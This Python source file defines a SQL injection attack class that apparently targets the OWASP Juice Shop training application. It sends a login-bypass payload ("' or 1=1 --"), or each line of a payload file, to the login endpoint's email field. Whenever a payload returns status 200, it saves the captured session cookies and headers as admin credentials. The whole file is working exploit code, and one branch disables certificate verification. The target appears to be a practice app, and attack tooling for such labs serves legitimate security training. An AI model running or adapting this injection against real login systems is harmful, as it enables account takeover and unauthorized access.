from . import attack as a

class SQL_injector(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/login'
        #self.juice_session.cookies = a.cookielib.LWPCookieJar(filename="./juiceShopCookies.txt")

    def generator(self, myScript):
        #cookies = COOKIE
        headers = a.HEADER

        json_data = {
            'email': myScript,
            'password': '123',
        }
        return headers, json_data

    def run(self, userInput = '\' or 1=1 --', username = 'admin'):
        # [-4:]
        if userInput[-4:] == '.txt':
            f = open(userInput, "r")
            for line in f:
                line = line.rstrip()
                headers, json_data = self.generator(line)
                response = self.juice_session.post(self.url, json=json_data, verify=False)
                print(response.status_code)
                if response.status_code == 200:
                    print("Valid script: ", json_data['email'])
                    newCookie, newHeader = a.modify_cookie_header(response)
                    a.auth_write('admin',newCookie,newHeader)
                    break
        else:
            headers, json_data = self.generator(userInput)
            response = self.juice_session.post(self.url, json=json_data)
            print(response.status_code)
            if response.status_code == 200:
                print(response.text)
                print("Valid script: ", json_data['email'])
                newCookie, newHeader = a.modify_cookie_header(response)
                a.auth_write(username,newCookie,newHeader)
            return response.status_code